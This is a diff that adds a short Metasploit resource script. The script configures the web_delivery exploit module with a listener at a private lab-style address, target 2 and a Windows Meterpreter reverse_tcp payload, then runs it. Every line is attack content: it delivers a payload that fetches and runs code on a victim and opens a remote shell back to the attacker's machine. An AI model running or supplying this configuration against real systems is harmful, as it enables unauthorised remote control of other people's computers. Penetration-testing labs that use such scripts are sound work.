@@ -1,0 +1,5 @@
+use exploit/multi/script/web_delivery
+set LHOST 192.168.56.1
+set target 2
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
